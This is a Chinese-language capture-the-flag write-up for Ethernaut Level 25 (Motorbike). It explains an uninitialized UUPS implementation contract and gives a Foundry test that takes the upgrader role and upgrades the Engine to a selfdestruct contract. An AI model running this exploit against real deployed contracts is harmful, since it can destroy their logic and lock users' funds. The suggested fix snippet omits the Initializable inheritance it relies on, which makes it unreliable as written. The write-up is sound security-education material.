---
title: 'Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞'
date: 2025-01-25 17:10:00
updated: 2025-01-25 17:10:00
categories:
  - Ethernaut 系列
  - 高级攻击篇 (21-25)
tags:
  - Ethernaut
  - Foundry
  - Proxy
  - UUPS
  - Uninitialized Implementation
  - 智能合约安全
series: Ethernaut Foundry Solutions
excerpt: "利用UUPS代理模式中实现合约未被初始化的漏洞，直接调用实现合约的 `initialize` 函数成为 `upgrader`。随后，将实现合约升级为一个恶意的自毁合约，从而摧毁引擎，掌握 Motorbike 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞

> **关卡链接**: [Ethernaut Level 25 - Motorbike](https://ethernaut.openzeppelin.com/level/25)  
> **攻击类型**: 未初始化的实现合约 (Uninitialized Implementation)  
> **难度**: ⭐⭐⭐⭐☆

## 📋 挑战目标

本关的目标是摧毁 `Engine` (引擎) 合约，即使得 `Engine` 合约的代码被从链上移除。你需要利用代理合约的漏洞来实现这一目标。

![Motorbike Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg)

## 🔍 漏洞分析

本关卡涉及的是 UUPS (Universal Upgradeable Proxy Standard) 代理模式。在这种模式下，升级逻辑位于实现合约（`Engine`）中，而不是代理合约（`Motorbike`）中。

-   `Motorbike`: 代理合约，负责将调用转发到 `Engine`。
-   `Engine`: 实现合约，包含业务逻辑和升级逻辑。

通常，代理合约在部署后会调用实现合约的 `initialize` 函数来设置初始状态（如 `owner`, `upgrader` 等）。然而，这个初始化调用只发生在代理合约的上下文中。**实现合约本身（即 `Engine` 合约）的 `initialize` 函数从未被调用过**，导致其状态变量（如 `upgrader`）仍为默认值（`address(0)`）。

这就是核心漏洞：任何人都可以直接调用 `Engine` 实现合约的 `initialize()` 函数。

```solidity
// In Engine.sol
address public upgrader;

function initialize() public {
    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract
    upgrader = msg.sender;
}
```

一旦我们调用了 `Engine` 的 `initialize()`，我们就会成为 `Engine` 合约的 `upgrader`。作为 `upgrader`，我们就可以调用 `upgradeToAndCall()` 函数。

```solidity
// In Engine.sol
function upgradeToAndCall(address newImplementation, bytes memory data) public payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}

function _authorizeUpgrade() internal view {
    require(msg.sender == upgrader, "Can't upgrade");
}
```

`upgradeToAndCall()` 允许我们将 `Engine` 的实现指向一个全新的合约，并执行新合约中的任意函数。我们的攻击计划是：

1.  **找到 `Engine` 实现合约的地址**: UUPS代理的实现地址存储在特定的存储槽位 `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`。
2.  **成为 `upgrader`**: 直接调用 `Engine` 合约的 `initialize()` 函数。
3.  **部署恶意合约**: 创建一个包含 `selfdestruct` 逻辑的攻击合约。
4.  **升级并自毁**: 调用 `Engine` 的 `upgradeToAndCall()`，将实现指向我们的恶意合约，并调用其自毁函数。

**关于 Dencun 升级 (EIP-6780) 的说明**: 在 Dencun 升级后，`selfdestruct` 的行为发生了变化。它不再无条件地移除合约代码。然而，在许多测试环境和一些特定条件下，此攻击仍然有效。本解法基于 `selfdestruct` 能够移除合约代码的经典行为。

## 💻 Foundry 实现

### Foundry 测试代码

测试代码将完整地模拟上述攻击流程。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/25_Motorbike.sol";

// 接口定义
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
    function upgrader() external view returns (address);
}

// 包含自毁逻辑的攻击合约
contract Attack {
    function boom() external payable {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeTest is Test {
    Motorbike motorbikeInstance;
    IEngine engineInstance;
    address player;
    address engineAddress;

    function setUp() public {
        player = vm.addr(1);
        
        // 部署关卡合约
        Engine engine = new Engine();
        motorbikeInstance = new Motorbike(address(engine));

        // 从代理合约的存储中读取实现合约的地址
        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));
        engineInstance = IEngine(engineAddress);
    }

    function testMotorbikeAttack() public {
        vm.startPrank(player);

        // 1. 部署攻击合约
        Attack attackContract = new Attack();

        // 2. 直接调用实现合约的 initialize 函数，成为 upgrader
        engineInstance.initialize();
        assertEq(engineInstance.upgrader(), player, "Player should be the upgrader");

        // 3. 升级实现合约为我们的攻击合约，并调用 boom() 函数自毁
        bytes memory data = abi.encodeWithSignature("boom()");
        engineInstance.upgradeToAndCall(address(attackContract), data);

        // 4. 验证实现合约的代码是否已被移除
        assertEq(engineAddress.code.length, 0, "Engine contract should be destroyed");

        vm.stopPrank();
    }
}
```

### 关键攻击步骤

1.  **定位实现合约**: 使用 `vm.load` 和 EIP-1967 定义的存储槽位地址，从代理合约中找到 `Engine` 实现合约的地址。
2.  **调用 `initialize()`**: 直接与 `Engine` 合约交互，调用其 `initialize()` 函数，将 `player` 设置为 `upgrader`。
3.  **部署攻击合约**: 创建一个简单的 `Attack` 合约，其中包含一个公共的 `boom()` 函数，该函数会调用 `selfdestruct`。
4.  **执行 `upgradeToAndCall()`**: 调用 `Engine` 合约的 `upgradeToAndCall()`，将 `newImplementation` 设置为 `Attack` 合约的地址，并将 `data` 设置为 `boom()` 函数的函数选择器。

## 🛡️ 防御措施

1.  **初始化实现合约**: 在部署实现合约后，应立即调用其 `initialize` 函数（或在构造函数中完成初始化），以防止其他人抢先调用。可以添加一个 `initialized` 状态变量来确保初始化只进行一次。

    ```solidity
    // 修复建议
    contract Engine {
        bool private _initialized;
        constructor() {
            _disableInitializers();
        }
        function initialize() public initializer {
            // ...
        }
    }
    ```
    OpenZeppelin 的 `Initializable` 合约提供了一个 `initializer` 修饰符，可以很好地解决这个问题。

2.  **构造函数中初始化**: 对于不可升级的合约，应在 `constructor` 中完成所有初始化，以确保在部署时就设置好所有权和关键参数。

## 🔧 相关工具和技术

-   **UUPS (Universal Upgradeable Proxy Standard)**: EIP-1822 定义的一种代理模式，它将升级逻辑放在实现合约中，比旧的透明代理模式更节省 Gas。
-   **EIP-1967**: 定义了代理合约中用于存储逻辑合约地址和管理员地址的标准存储槽位，以避免存储冲突。
-   **未初始化的代理/实现**: 代理合约安全中一个常见的漏洞类别。无论是代理本身还是其实现合约，如果其初始化函数可以被任何人调用，就会导致严重的安全问题。

## 🎯 总结

**核心概念**:
-   在使用 UUPS 代理模式时，不仅代理需要初始化，其底层的实现合约也需要被正确地初始化或禁用初始化函数。
-   实现合约本身是一个独立的、可直接交互的合约，必须确保其公共/外部函数受到与代理合约相同的访问控制保护。

**攻击向量**:
-   找到未被初始化的实现合约。
-   直接调用其初始化函数以获取特权（如 `upgrader` 角色）。
-   利用获得的特权执行恶意操作（如升级到恶意实现并自毁）。

**防御策略**:
-   确保实现合约的构造函数或一个一次性的部署脚本会调用其初始化函数，并设置 `initialized` 标志，防止重入。
-   使用经过审计和广泛使用的代理实现，如 OpenZeppelin 的 UUPS-Upgradeable 合约。

## 📚 参考资料

-   [EIP-1822: Universal Upgradeable Proxy Standard (UUPS)](https://eips.ethereum.org/EIPS/eip-1822)
-   [OpenZeppelin Docs: UUPS Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies)